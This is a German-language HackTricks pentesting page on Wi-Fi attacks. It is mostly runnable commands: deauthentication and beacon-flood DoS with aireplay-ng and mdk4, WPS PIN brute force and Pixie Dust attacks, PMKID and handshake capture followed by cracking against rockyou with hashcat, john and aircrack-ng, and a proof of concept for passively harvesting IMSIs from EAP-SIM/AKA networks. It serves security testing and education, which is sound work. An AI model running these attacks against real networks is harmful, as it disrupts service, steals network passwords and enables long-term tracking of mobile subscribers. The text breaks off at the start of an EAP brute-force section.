# Pentesting Wifi

{{#include ../../banners/hacktricks-training.md}}

## Wifi grundlegende Befehle
```bash
ip link show #List available interfaces
iwconfig #List available interfaces
airmon-ng check kill #Kill annoying processes
airmon-ng start wlan0 #Monitor mode
airmon-ng stop wlan0mon #Managed mode
airodump-ng wlan0mon #Scan (default 2.4Ghz)
airodump-ng wlan0mon --band a #Scan 5Ghz
airodump-ng wlan0mon --wps #Scan WPS
iwconfig wlan0 mode monitor #Put in mode monitor
iwconfig wlan0mon mode managed #Quit mode monitor - managed mode
iw dev wlan0 scan | grep "^BSS\|SSID\|WSP\|Authentication\|WPS\|WPA" #Scan available wifis
iwlist wlan0 scan #Scan available wifis
```
## Werkzeuge

### Hijacker & NexMon (Android internal Wi-Fi)


{{#ref}}
enable-nexmon-monitor-and-injection-on-android.md
{{#endref}}

### EAPHammer
```
git clone https://github.com/s0lst1c3/eaphammer.git
./kali-setup
```
### Airgeddon
```bash
mv `which dhcpd` `which dhcpd`.old
apt install isc-dhcp-server
apt-get install sslstrip asleap bettercap mdk4 hostapd beef-xss lighttpd dsniff hostapd-wpe
```
**airgeddon mit docker ausführen**
```bash
docker run \
--rm \
-ti \
--name airgeddon \
--net=host \
--privileged \
-p 3000:3000 \
-v /tmp:/io \
-e DISPLAY=$(env | grep DISPLAY | awk -F "=" '{print $2}') \
v1s1t0r1sh3r3/airgeddon
```
Von: [https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux](https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux)

### wifiphisher

Es kann Evil Twin-, KARMA- und Known Beacons-Angriffe durchführen und anschließend eine phishing-Vorlage verwenden, um das tatsächliche Netzwerkpasswort zu erlangen oder Zugangsdaten sozialer Netzwerke abzufangen.
```bash
git clone https://github.com/wifiphisher/wifiphisher.git # Download the latest revision
cd wifiphisher # Switch to tool's directory
sudo python setup.py install # Install any dependencies
```
### [Wifite2](https://github.com/derv82/wifite2)

Dieses Tool automatisiert **WPS/WEP/WPA-PSK**-Angriffe. Es wird automatisch:

- Setzt die Schnittstelle in den Monitor-Modus
- Scannt nach möglichen Netzwerken und erlaubt dir, die(n) Ziel(e) auszuwählen
- Wenn WEP - startet WEP-Angriffe
- Wenn WPA-PSK
- Wenn WPS: Pixie dust attack und der bruteforce attack (vorsichtig: der brute-force attack kann lange dauern). Beachte, dass es nicht null PINs oder database/generated PINs ausprobiert.
- Versucht, das PMKID vom AP zu erfassen, um es zu cracken
- Versucht, Clients des AP zu deauthentifizieren, um einen Handshake zu erfassen
- Wenn PMKID oder Handshake vorhanden, versucht es, mit den Top5000-Passwörtern zu bruteforcen.

## Angriffsübersicht

- **DoS**
- Deauthentication/disassociation -- Trennt alle Verbindungen (oder eine spezifische ESSID/einen spezifischen Client)
- Random fake APs -- Netze verbergen, kann Scanner abstürzen lassen
- Overload AP -- Versucht, den AP lahmzulegen (in der Regel nicht sehr nützlich)
- WIDS -- Mit dem IDS spielen
- TKIP, EAPOL -- Einige spezifische Angriffe, um einige APs mittels DoS anzugreifen
- **Cracking**
- Crack **WEP** (verschiedene Tools und Methoden)
- **WPA-PSK**
- **WPS** pin "Brute-Force"
- **WPA PMKID** bruteforce
- \[DoS +] **WPA handshake** erfassen + Cracking
- **WPA-MGT**
- **Username capture**
- **Bruteforce** Credentials
- **Evil Twin** (with or without DoS)
- **Open** Evil Twin \[+ DoS] -- Nützlich, um captive portal creds zu erfassen und/oder LAN-Angriffe durchzuführen
- **WPA-PSK** Evil Twin -- Nützlich für Netzwerkangriffe, wenn du das Passwort kennst
- **WPA-MGT** -- Nützlich, um Unternehmens-Zugangsdaten zu erfassen
- **KARMA, MANA**, **Loud MANA**, **Known beacon**
- **+ Open** -- Nützlich, um captive portal creds zu erfassen und/oder LAN-Angriffe durchzuführen
- **+ WPA** -- Nützlich, um WPA handshakes zu erfassen

## DOS

### Deauthentication Packets

**Description from** [**here**:](https://null-byte.wonderhowto.com/how-to/use-mdk3-for-advanced-wi-fi-jamming-0185832/)**.**

**Deauthentication**-Angriffe, eine verbreitete Methode im Wi‑Fi-Hacking, bestehen darin, "management"-Frames zu fälschen, um Geräte gewaltsam von einem Netzwerk zu trennen. Diese unverschlüsselten Pakete täuschen Clients, indem sie vorgeben, vom legitimen Netzwerk zu stammen, wodurch Angreifer WPA handshakes zum Cracking sammeln oder Netzwerkverbindungen dauerhaft stören können. Diese Taktik ist durch ihre Einfachheit alarmierend, weit verbreitet und hat erhebliche Auswirkungen auf die Netzwerksicherheit.

**Deauthentication using Aireplay-ng**
```
aireplay-ng -0 0 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 ath0
```
- -0 bedeutet deauthentication
- 1 ist die Anzahl der zu sendenden deauths (du kannst mehrere senden, wenn du möchtest); 0 bedeutet, sie kontinuierlich zu senden
- -a 00:14:6C:7E:40:80 ist die MAC-Adresse des Access Points
- -c 00:0F:B5:34:30:30 ist die MAC-Adresse des Clients, der deauthenticate werden soll; wird dies weggelassen, wird eine broadcast deauthentication gesendet (funktioniert nicht immer)
- ath0 ist der Schnittstellenname

### Disassociation Packets

**Disassociation packets**, ähnlich wie deauthentication packets, sind eine Art Management-Frame, die in Wi‑Fi-Netzen verwendet werden. Diese Pakete dienen dazu, die Verbindung zwischen einem Gerät (z. B. einem Laptop oder Smartphone) und einem Access Point (AP) zu trennen. Der Hauptunterschied zwischen disassociation und deauthentication liegt in ihren Einsatzszenarien. Während ein AP **deauthentication packets to remove rogue devices explicitly from the network, disassociation packets are typically sent when the AP is undergoing a shutdown**, werden disassociation packets typischerweise bei Abschaltung, Neustart oder Standortwechsel des AP gesendet, wodurch die Trennung aller verbundenen Knoten erforderlich wird.

Dieser Angriff kann mit mdk4(mode "d") durchgeführt werden:
```bash
# -c <channel>
# -b victim_client_mac.txt contains the MAC address of the device to eliminate
# -e WifiName is the name of the wifi
# -B BSSID is the BSSID of the AP
# Notice that these and other parameters aare optional, you could give onli the ESSID and md4k will automatically search for it, wait for finding clients and deauthenticate them
mdk4 wlan0mon d -c 5 -b victim_client_mac.txt -E WifiName -B EF:60:69:D7:69:2F
```
### **Weitere DOS-Angriffe von mdk4**

**Siehe** [**here**](https://en.kali.tools/?p=864)**.**

**ATTACK MODE b: Beacon Flooding**

Sendet beacon frames, um Clients gefälschte APs anzuzeigen. Dies kann manchmal Netzwerkscanner und sogar Treiber zum Absturz bringen!
```bash
# -a Use also non-printable caracters in generated SSIDs and create SSIDs that break the 32-byte limit
# -w n (create Open) t (Create WPA/TKIP) a (Create WPA2/AES)
# -m use real BSSIDS
# All the parameters are optional and you could load ESSIDs from a file
mdk4 wlan0mon b -a -w nta -m
```
**ATTACK MODE a: Authentication Denial-Of-Service**

Das Senden von authentication frames an alle erreichbaren Access Points (APs) in Reichweite kann diese APs überlasten, insbesondere wenn viele Clients beteiligt sind. Dieser starke Traffic kann zu Systeminstabilität führen und dazu, dass einige APs einfrieren oder sogar zurückgesetzt werden.
```bash
# -a BSSID send random data from random clients to try the DoS
# -i BSSID capture and repeat pakets from authenticated clients
# -m use real MACs
# only -a or -i can be used
mdk4 wlan0mon a [-i EF:60:69:D7:69:2F] [-a EF:60:69:D7:69:2F] -m
```
**ATTACK MODE p: SSID Probing and Bruteforcing**

Probing von Access Points (APs) prüft, ob eine SSID korrekt angezeigt wird und bestätigt die Reichweite des APs. Diese Technik, kombiniert mit **bruteforcing hidden SSIDs** mit oder ohne wordlist, hilft dabei, versteckte Netzwerke zu identifizieren und zu erreichen.

**ATTACK MODE m: Michael Countermeasures Exploitation**

Das Senden von zufälligen oder doppelten Paketen an verschiedene QoS-Queues kann Michael Countermeasures auf **TKIP APs** auslösen und zu einer einminütigen Abschaltung des APs führen. Diese Methode ist eine effiziente **DoS** (Denial of Service)-Angriffstaktik.
```bash
# -t <BSSID> of a TKIP AP
# -j use inteligent replay to create the DoS
mdk4 wlan0mon m -t EF:60:69:D7:69:2F [-j]
```
**ATTACK MODE e: EAPOL Start and Logoff Packet Injection**

Das Fluten eines AP mit **EAPOL Start frames** erzeugt **fake sessions**, überlastet den AP und blockiert legitime Clients. Alternativ führt das Injizieren von **fake EAPOL Logoff messages** zum zwangsweisen Trennen von Clients; beide Methoden stören effektiv den Netzwerkdienst.
```bash
# Use Logoff messages to kick clients
mdk4 wlan0mon e -t EF:60:69:D7:69:2F [-l]
```
**ATTACK MODE s: Angriffe auf IEEE 802.11s Mesh-Netzwerke**

Verschiedene Angriffe auf Link-Management und Routing in Mesh-Netzwerken.

**ATTACK MODE w: WIDS-Verwirrung**

Das Verbinden von Clients mit mehreren WDS-Knoten oder mit gefälschten rogue APs kann Intrusion Detection and Prevention Systems manipulieren, Verwirrung erzeugen und potenziellen Missbrauch des Systems ermöglichen.
```bash
# -z activate Zero_Chaos' WIDS exploit (authenticates clients from a WDS to foreign APs to make WIDS go nuts)
mkd4 -e <SSID> -c <channel> [-z]
```
**ATTACK MODE f: Packet Fuzzer**

Ein packet fuzzer mit verschiedenen Paketquellen und einem umfassenden Satz von Modifikatoren zur Paketmanipulation.

### **Airggedon**

_**Airgeddon**_ bietet die meisten der zuvor vorgeschlagenen Angriffe:

![](<../../images/image (95).png>)

## WPS

WPS (Wi-Fi Protected Setup) vereinfacht den Prozess, Geräte mit einem Router zu verbinden, und erhöht die Geschwindigkeit und Benutzerfreundlichkeit der Einrichtung für Netzwerke, die mit **WPA** oder **WPA2** Personal verschlüsselt sind. Für die leicht angreifbare WEP-Sicherheit ist es wirkungslos. WPS verwendet eine 8-stellige PIN, die in zwei Hälften validiert wird, wodurch es anfällig für brute-force attacks ist, da die Anzahl der Kombinationen begrenzt ist (ca. 11.000 Möglichkeiten).

### WPS Bruteforce

Es gibt 2 Haupttools, um diesen Angriff durchzuführen: Reaver und Bully.

- **Reaver** wurde entwickelt, um ein robustes und praxisnahes Werkzeug für Angriffe gegen WPS zu sein, und wurde gegen eine Vielzahl von Access Points und WPS-Implementierungen getestet.
- **Bully** ist eine **new implementation** des WPS brute force attack, geschrieben in C. Es bietet mehrere Vorteile gegenüber dem ursprünglichen reaver-Code: weniger Abhängigkeiten, verbesserte Speicher- und CPU-Performance, korrektes Handling von endianness und ein robusteres Optionsspektrum.

Der Angriff nutzt die **WPS PIN-Schwachstelle** aus, insbesondere die Offenlegung der ersten vier Ziffern und die Rolle der letzten Ziffer als Prüfsumme, was den brute-force attack erleichtert. Allerdings erfordern Abwehrmaßnahmen gegen brute-force attacks, wie das **Blockieren von MAC-Adressen** aggressiver Angreifer, eine **Rotation der MAC-Adresse**, um den Angriff fortzusetzen.

Nach dem Erhalten der WPS PIN mit Tools wie Bully oder Reaver kann der Angreifer den WPA/WPA2 PSK ableiten und somit **dauerhaften Netzwerkzugang** sicherstellen.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -b -f -N [-L -d 2] -vvroot
bully wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -S -F -B -v 3
```
**Smart Brute Force**

Dieser verfeinerte Ansatz zielt auf WPS PINs ab und nutzt bekannte Schwachstellen:

1. **Pre-discovered PINs**: Nutzen Sie eine Datenbank bekannter PINs, die mit bestimmten Herstellern verknüpft ist, die dafür bekannt sind, einheitliche WPS PINs zu verwenden. Diese Datenbank korreliert die ersten drei Oktette der MAC-addresses mit wahrscheinlichen PINs für diese Hersteller.
2. **PIN Generation Algorithms**: Setzen Sie Algorithmen wie ComputePIN und EasyBox ein, die WPS PINs basierend auf der MAC-address des AP berechnen. Der Arcadyan-Algorithmus benötigt zusätzlich eine device ID, wodurch der PIN-Generierungsprozess eine zusätzliche Ebene erhält.

### WPS Pixie Dust attack

**Dominique Bongard** entdeckte eine Schwachstelle in einigen Access Points (APs) bei der Erstellung geheimer Codes, bekannt als **nonces** (**E-S1** und **E-S2**). Wenn diese nonces ermittelt werden können, wird das Knacken des WPS PIN des APs einfach. Der AP offenbart den PIN innerhalb eines speziellen Codes (hash), um zu beweisen, dass er legitim und kein falscher (rogue) AP ist. Diese nonces sind im Wesentlichen die "Schlüssel", um den "Tresor" zu öffnen, der den WPS PIN enthält. Mehr dazu findet sich [here](<https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)>).

Einfach ausgedrückt besteht das Problem darin, dass einige APs nicht ausreichend zufällige Keys für die Verschlüsselung des PINs während des Verbindungsprozesses verwendet haben. Das macht den PIN anfällig dafür, von außerhalb des Netzwerks erraten zu werden (offline brute force attack).
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -K 1 -N -vv
bully  wlan1mon -b 00:C0:CA:78:B1:37 -d -v 3
```
Wenn du das Gerät nicht in den monitor mode versetzen möchtest oder `reaver` und `bully` Probleme haben, kannst du [OneShot-C](https://github.com/nikita-yfh/OneShot-C) ausprobieren. Dieses Tool kann einen Pixie Dust-Angriff durchführen, ohne in den monitor mode wechseln zu müssen.
```bash
./oneshot -i wlan0 -K -b 00:C0:CA:78:B1:37
```
### Null Pin attack

Einige schlecht gestaltete Systeme erlauben sogar, dass eine **Null PIN** (eine leere oder nicht vorhandene PIN) Zugang gewährt, was ziemlich ungewöhnlich ist. Das Tool **Reaver** kann auf diese Schwachstelle testen, im Gegensatz zu **Bully**.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -f -N -g 1 -vv -p ''
```
### Airgeddon

Alle vorgeschlagenen WPS-Angriffe können leicht mit _**airgeddon.**_ durchgeführt werden.

![](<../../images/image (219).png>)

- 5 und 6 ermöglichen es dir, **deinen eigenen PIN** zu versuchen (falls du einen hast)
- 7 und 8 führen die **Pixie Dust attack** aus
- 13 erlaubt dir, den **NULL PIN** zu testen
- 11 und 12 werden **die mit dem ausgewählten AP in verfügbaren Datenbanken verknüpften PINs** recollecten und **generieren** mögliche **PINs** mit: ComputePIN, EasyBox und optional Arcadyan (empfohlen, warum nicht?)
- 9 und 10 werden **jeden möglichen PIN** testen

## **WEP**

So broken und heutzutage ungenutzt. Nur zur Info: _**airgeddon**_ hat eine WEP-Option namens "All-in-One", um diese Art von Schutz anzugreifen. Weitere Tools bieten ähnliche Optionen.

![](<../../images/image (432).png>)

---

---

## WPA/WPA2 PSK

### PMKID

In 2018 hat **hashcat** [einen neuen Angriffsweg enthüllt](https://hashcat.net/forum/thread-7717.html), einzigartig, weil er nur **ein einziges Paket** benötigt und keine Clients erfordert, die mit dem Ziel-AP verbunden sind — nur Interaktion zwischen Angreifer und AP.

Viele moderne Router fügen dem **ersten EAPOL**-Frame während des Verbindungsaufbaus ein **optionales Feld** hinzu, bekannt als `Robust Security Network`. Dieses enthält den `PMKID`.

Wie der ursprüngliche Beitrag erklärt, wird der **PMKID** mithilfe bekannter Daten erstellt:
```bash
PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)
```
Da der "PMK Name" konstant ist, wir die BSSID des AP und der station kennen und der `PMK` identisch mit dem aus einem vollständigen 4-way handshake ist, kann **hashcat** diese Informationen verwenden, um den PSK zu knacken und die Passphrase wiederherzustellen!

Um diese Informationen zu **gather** und das Passwort lokal zu **bruteforce**, kannst du Folgendes tun:
```bash
airmon-ng check kill
airmon-ng start wlan0
git clone https://github.com/ZerBea/hcxdumptool.git; cd hcxdumptool; make; make install
hcxdumptool -o /tmp/attack.pcap -i wlan0mon --enable_status=1
```

```bash
#You can also obtains PMKIDs using eaphammer
./eaphammer --pmkid --interface wlan0 --channel 11 --bssid 70:4C:A5:F8:9A:C1
```
Die **PMKIDs captured** werden in der **console** angezeigt und außerdem **saved** in \_ **/tmp/attack.pcap**\_\
Now, convert the capture to **hashcat/john** format and crack it:
```bash
hcxtools/hcxpcaptool -z hashes.txt /tmp/attack.pcapng
hashcat -m 16800 --force hashes.txt /usr/share/wordlists/rockyou.txt
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
Bitte beachten Sie, dass das Format eines korrekten Hashes aus **4 Teilen** besteht, wie: `4017733ca8db33a1479196c2415173beb808d7b83cfaa4a6a9a5aae7566f6461666f6e65436f6e6e6563743034383131343838` Wenn Ihrer **nur** **3 Teile** enthält, dann ist er **ungültig** (die PMKID-Erfassung war nicht gültig).

Bitte beachten Sie, dass `hcxdumptool` **auch handshakes erfasst** (so etwas wird erscheinen: **`MP:M1M2 RC:63258 EAPOLTIME:17091`**). Du kannst die **handshakes** in das **hashcat**/**john**-Format mit `cap2hccapx` umwandeln.
```bash
tcpdump -r /tmp/attack.pcapng -w /tmp/att.pcap
cap2hccapx pmkid.pcapng pmkid.hccapx ["Filter_ESSID"]
hccap2john pmkid.hccapx > handshake.john
john handshake.john --wordlist=/usr/share/wordlists/rockyou.txt
aircrack-ng /tmp/att.pcap -w /usr/share/wordlists/rockyou.txt #Sometimes
```
_Mir ist aufgefallen, dass sich einige mit diesem Tool erfasste handshakes nicht cracked ließen, selbst wenn das korrekte password bekannt war. Ich empfehle, wenn möglich handshakes auch auf traditionelle Weise zu erfassen oder mehrere davon mit diesem Tool aufzunehmen._

### Handshake capture

Ein Angriff auf **WPA/WPA2**-Netzwerke kann durchgeführt werden, indem man einen **handshake** erfasst und versucht, das **password** **offline** zu **crack**en. Dieser Prozess umfasst die Überwachung der Kommunikation eines bestimmten Netzwerks und der **BSSID** auf einem bestimmten **channel**. Hier eine vereinfachte Anleitung:

1. Ermitteln Sie die **BSSID**, den **channel**, und einen **connected client** des Zielnetzwerks.
2. Verwenden Sie `airodump-ng`, um den Netzwerkverkehr auf dem angegebenen **channel** und der **BSSID** zu überwachen, in der Hoffnung, einen **handshake** zu erfassen. Der Befehl sieht folgendermaßen aus:
```bash
airodump-ng wlan0 -c 6 --bssid 64:20:9F:15:4F:D7 -w /tmp/psk --output-format pcap
```
3. Um die Chance zu erhöhen, einen handshake zu erfassen, trennen Sie den Client kurzzeitig vom Netzwerk, um eine erneute Authentifizierung zu erzwingen. Dies kann mit dem Befehl `aireplay-ng` durchgeführt werden, der deauthentication packets an den Client sendet:
```bash
aireplay-ng -0 0 -a 64:20:9F:15:4F:D7 wlan0 #Send generic deauth packets, may not work in all scenarios
```
_Beachte, dass sich der client, da er deauthenticated wurde, mit einem anderen AP oder in anderen Fällen mit einem anderen network verbinden könnte._

Sobald in `airodump-ng` einige handshake-Informationen erscheinen, bedeutet das, dass der handshake erfasst wurde und du das Mithören stoppen kannst:

![](<../../images/image (172) (1).png>)

Sobald der handshake erfasst wurde, kannst du ihn mit `aircrack-ng` **crack**en:
```
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 64:20:9F:15:4F:D7 /tmp/psk*.cap
```
### Prüfen, ob ein handshake in der Datei vorhanden ist

**aircrack**
```bash
aircrack-ng psk-01.cap #Search your bssid/essid and check if any handshake was capture
```
**tshark**
```bash
tshark -r psk-01.cap -n -Y eapol #Filter handshake messages #You should have the 4 messages.
```
[**cowpatty**](https://github.com/roobixx/cowpatty)
```
cowpatty -r psk-01.cap -s "ESSID" -f -
```
_Wenn dieses Tool einen unvollständigen Handshake einer ESSID vor dem abgeschlossenen Handshake findet, erkennt es den gültigen nicht._

**pyrit**
```bash
apt-get install pyrit #Not working for newer versions of kali
pyrit -r psk-01.cap analyze
```
## **WPA Enterprise (MGT)**

In **Enterprise-WiFi-Umgebungen wirst du auf verschiedene Authentifizierungsverfahren stoßen**, die jeweils unterschiedliche Sicherheitsstufen und Verwaltungsfunktionen bieten. Wenn du Tools wie `airodump-ng` verwendest, um den Netzwerkverkehr zu untersuchen, kannst du Kennungen dieser Authentifizierungstypen bemerken. Zu den häufigsten Methoden gehören:
```
6A:FE:3B:73:18:FB  -58       19        0    0   1  195  WPA2 CCMP   MGT  NameOfMyWifi
```
1. **EAP-GTC (Generic Token Card)**:
- Diese Methode unterstützt Hardware-Tokens und One-Time-Passwords innerhalb von EAP-PEAP. Anders als MSCHAPv2 verwendet sie keine Peer-Challenge und sendet Passwörter im Klartext an den Access Point, was ein Risiko für Downgrade-Angriffe darstellt.
2. **EAP-MD5 (Message Digest 5)**:
- Beinhaltet das Senden des MD5-Hashes des Passworts vom Client. Es wird **nicht empfohlen** wegen Anfälligkeit für Wörterbuchangriffe, fehlender Serverauthentifizierung und der Unfähigkeit, sessionspezifische WEP-Keys zu erzeugen.
3. **EAP-TLS (Transport Layer Security)**:
- Nutzt sowohl Client- als auch Server-Zertifikate zur Authentifizierung und kann dynamisch benutzer- und sessionsbasierte WEP-Keys zur Sicherung der Kommunikation erzeugen.
4. **EAP-TTLS (Tunneled Transport Layer Security)**:
- Bietet gegenseitige Authentifizierung über einen verschlüsselten Tunnel sowie eine Methode zur Ableitung dynamischer, pro Benutzer und pro Session gültiger WEP-Keys. Erfordert nur Server-seitige Zertifikate; Clients nutzen Anmeldeinformationen.
5. **PEAP (Protected Extensible Authentication Protocol)**:
- Funktioniert ähnlich wie EAP, indem ein TLS-Tunnel für geschützte Kommunikation aufgebaut wird. Dadurch können schwächere Authentifizierungsprotokolle oberhalb von EAP verwendet werden, da der Tunnel Schutz bietet.
- **PEAP-MSCHAPv2**: Häufig einfach als PEAP bezeichnet; kombiniert den verwundbaren MSCHAPv2 Challenge/Response-Mechanismus mit einem schützenden TLS-Tunnel.
- **PEAP-EAP-TLS (or PEAP-TLS)**: Ähnlich zu EAP-TLS, startet aber einen TLS-Tunnel bevor Zertifikate ausgetauscht werden, und bietet dadurch eine zusätzliche Sicherheitsschicht.

Weitere Informationen zu diesen Authentifizierungsmethoden finden Sie [here ](https://en.wikipedia.org/wiki/Extensible_Authentication_Protocol)and [here](https://www.intel.com/content/www/us/en/support/articles/000006999/network-and-i-o/wireless-networking.html).

### Benutzername-Erfassung

Beim Lesen von [https://tools.ietf.org/html/rfc3748#page-27](https://tools.ietf.org/html/rfc3748#page-27) scheint es so, dass bei Verwendung von **EAP** die **"Identity"**-**Nachrichten** unterstützt werden müssen und der **Benutzername** im **Klartext** in den **"Response Identity"**-Nachrichten gesendet wird.

Selbst bei Verwendung einer der sichersten Authentifizierungsmethoden: **PEAP-EAP-TLS**, ist es möglich, den im EAP-Protokoll gesendeten **Benutzernamen zu erfassen**. Dazu erfasst man eine Authentifizierungskommunikation (starte `airodump-ng` im entsprechenden Kanal und `wireshark` im selben Interface) und filtert die Pakete nach `eapol`.\
Innerhalb des "**Response, Identity**"-Pakets erscheint der **Benutzername** des Clients.

![](<../../images/image (850).png>)

### Anonyme Identitäten

Identity hiding wird sowohl von EAP-PEAP als auch von EAP-TTLS unterstützt. Im Kontext eines WiFi-Netzwerks wird eine EAP-Identity-Anfrage typischerweise vom Access Point (AP) während des Assoziierungsprozesses initiiert. Um die Anonymität des Benutzers zu schützen, enthält die Antwort des EAP-Clients auf dem Gerät des Nutzers nur die unbedingt erforderlichen Informationen, die der initiale RADIUS-Server zur Verarbeitung der Anfrage benötigt. Dieses Konzept wird in den folgenden Szenarien veranschaulicht:

- EAP-Identity = anonymous
- In diesem Szenario verwenden alle Nutzer die pseudonyme Kennung "anonymous" als Benutzeridentifikator. Der initiale RADIUS-Server fungiert entweder als EAP-PEAP- oder EAP-TTLS-Server und ist für die Server-Seite des PEAP- bzw. TTLS-Protokolls verantwortlich. Die innere (geschützte) Authentifizierungsmethode wird dann entweder lokal gehandhabt oder an einen entfernten (home) RADIUS-Server delegiert.
- EAP-Identity = anonymous@realm_x
- In diesem Fall verbergen Nutzer aus verschiedenen Realms ihre Identität, geben aber ihren jeweiligen Realm an. Dadurch kann der initiale RADIUS-Server die EAP-PEAP- oder EAP-TTLS-Anfragen an die RADIUS-Server in ihren Home-Realms weiterleiten, die als PEAP- bzw. TTLS-Server agieren. Der initiale RADIUS-Server fungiert in diesem Szenario ausschließlich als RADIUS-Relay-Knoten.
- Alternativ kann der initiale RADIUS-Server als EAP-PEAP- oder EAP-TTLS-Server fungieren und die geschützte Authentifizierungsmethode entweder selbst handhaben oder an einen anderen Server weiterleiten. Diese Option ermöglicht die Konfiguration unterschiedlicher Richtlinien für verschiedene Realms.

Bei EAP-PEAP, sobald der TLS-Tunnel zwischen dem PEAP-Server und dem PEAP-Client etabliert ist, initiiert der PEAP-Server eine EAP-Identity-Anfrage und überträgt sie durch den TLS-Tunnel. Der Client antwortet auf diese zweite EAP-Identity-Anfrage, indem er eine EAP-Identity-Antwort mit der wahren Identität des Nutzers durch den verschlüsselten Tunnel sendet. Dieser Ansatz verhindert effektiv, dass die tatsächliche Identität des Nutzers von jemandem, der den 802.11-Verkehr abhört, offengelegt wird.

EAP-TTLS folgt einem leicht abweichenden Verfahren. Bei EAP-TTLS authentifiziert sich der Client typischerweise mit PAP oder CHAP, abgesichert durch den TLS-Tunnel. In diesem Fall fügt der Client nach dem Aufbau des Tunnels eine User-Name-Attribute sowie entweder ein Password- oder CHAP-Password-Attribute in die initiale TLS-Nachricht ein.

Unabhängig vom gewählten Protokoll erlangt der PEAP/TTLS-Server Kenntnis über die wahre Identität des Nutzers, nachdem der TLS-Tunnel etabliert wurde. Die wahre Identität kann als user@realm oder einfach user dargestellt werden. Wenn der PEAP/TTLS-Server auch für die Authentifizierung des Nutzers zuständig ist, besitzt er nun die Identität des Nutzers und fährt mit der durch den TLS-Tunnel geschützten Authentifizierungsmethode fort. Alternativ kann der PEAP/TTLS-Server eine neue RADIUS-Anfrage an den Home-RADIUS-Server des Nutzers weiterleiten. Diese neue RADIUS-Anfrage lässt die PEAP- oder TTLS-Protokollschicht weg. Wenn die geschützte Authentifizierungsmethode EAP ist, werden die inneren EAP-Nachrichten ohne den EAP-PEAP- oder EAP-TTLS-Wrapper an den Home-RADIUS-Server übermittelt. Das User-Name-Attribut der ausgehenden RADIUS-Nachricht enthält die wahre Identität des Nutzers und ersetzt den anonymen User-Name der eingehenden RADIUS-Anfrage. Wenn die geschützte Authentifizierungsmethode PAP oder CHAP ist (nur von TTLS unterstützt), werden der User-Name und andere aus der TLS-Payload extrahierte Authentifizierungsattribute in der ausgehenden RADIUS-Nachricht ersetzt und verdrängen den anonymen User-Name und die TTLS EAP-Message-Attribute der eingehenden RADIUS-Anfrage.

Für weitere Informationen siehe [https://www.interlinknetworks.com/app_notes/eap-peap.htm](https://www.interlinknetworks.com/app_notes/eap-peap.htm)

### SIM-based EAP (EAP-SIM/EAP-AKA) identity leakage (IMSI exposure)

SIM-basierte Wi‑Fi-Authentifizierung mit EAP‑SIM/EAP‑AKA über 802.1X kann die permanente Teilnehmerkennung (IMSI) im Klartext während der unauthentifizierten Identity-Phase leak, wenn die Installation keine Pseudonyme/geschützten Identitäten oder keinen TLS-Tunnel um das innere EAP implementiert.

Where the leak happens (high level):
- 802.11-Association zum SSID abgeschlossen (oft Carrier-Offload-SSIDs wie FreeWifi_secure, eduroam-ähnliche Operator-Realms etc.).
- Authenticator sendet EAP-Request/Identity.
- Verwundbare Clients antworten mit EAP-Response/Identity mit ihrer permanenten Identität = IMSI kodiert als 3GPP NAI, noch bevor irgendein Schutz greift.
- Beispiel-NAI: 20815XXXXXXXXXX@wlan.mnc015.mcc208.3gppnetwork.org
- Jeder, der passiv RF abhört, kann dieses Frame lesen. Kein 4-way Handshake oder TLS-Keying ist erforderlich.

Quick PoC: passive IMSI harvesting on EAP‑SIM/AKA networks lacking identity privacy
<details>
<summary>Zum Erweitern klicken</summary>
```bash
# 1) Enable monitor mode
airmon-ng start wlan0

# 2) Optional: lock channel to the target BSS
airodump-ng wlan0mon --essid <SSID>

# 3) Capture 802.1X/EAP frames
# Wireshark display filters:
#   eap || eapol
#   (identity specifically): eap.code == 2 && eap.type == 1
# Kismet: add source wlan0mon; enable 802.1X/EAP views
# tcpdump (pcap capture):
#   tcpdump -i wlan0mon -s 0 -w eapsim_identity.pcap

# 4) Wait for a device to auto-connect to the SSID
# 5) Inspect the first EAP-Response/Identity frame
# Expected: ASCII NAI containing IMSI, e.g.
#   20815XXXXXXXXXX@wlan.mnc015.mcc208.3gppnetwork.org
```
</details>

Hinweise:
- Funktioniert vor jedem TLS‑Tunnel, wenn die Bereitstellung reines EAP‑SIM/AKA ohne geschützte Identität/Pseudonyme verwendet.
- Der exponierte Wert ist ein permanenter Identifikator, der an die SIM des Teilnehmers gebunden ist; das Sammeln ermöglicht langfristige Verfolgung und nachgelagerte Telekom‑Missbräuche.

Auswirkungen
- Datenschutz: persistentes Tracking von Benutzer(n)/Gerät(en) durch passive Wi‑Fi‑Erfassungen an öffentlichen Orten.
- Einstieg für Telekom‑Missbrauch: Mit der IMSI kann ein Angreifer mit SS7/Diameter‑Zugriff Standort abfragen oder versuchen, Anruf-/SMS‑Abhören und MFA‑Diebstahl durchzuführen.

Gegenmaßnahmen / worauf zu achten ist
- Überprüfen, dass Clients anonyme äußere Identitäten (Pseudonyme) für EAP‑SIM/AKA gemäß der 3GPP‑Richtlinie (z. B. 3GPP TS 33.402) verwenden.
- Bevorzugen Sie das Tunneln der Identity‑Phase (z. B. EAP‑TTLS/PEAP, das inneres EAP‑SIM/AKA trägt), sodass die IMSI niemals im Klartext gesendet wird.
- Paketmitschnitte von Association/Auth sollten niemals eine rohe IMSI in EAP-Response/Identity offenbaren.

Verwandt: Ausnutzung der Telekom‑Signalisierung mit erfassten mobilen Identifikatoren
{{#ref}}
../pentesting-network/telecom-network-exploitation.md
{{#endref}}

### EAP-Bruteforce (password spray)

Wenn vom Client erwartet wird, dass er einen **Benutzernamen und ein Passwort** verwendet (beachte, dass **EAP-TLS in diesem Fall nicht gültig sein wird**), kannst du versuchen, eine **Liste** von **Benutzernamen** (siehe nächsten Abschnitt) und **Passwörtern** zu beschaffen und den Zugriff mit **bruteforce** mithilfe von [**air-hammer**](https://github.com/Wh1t3Rh1n0/air-hammer)**.**
```bash
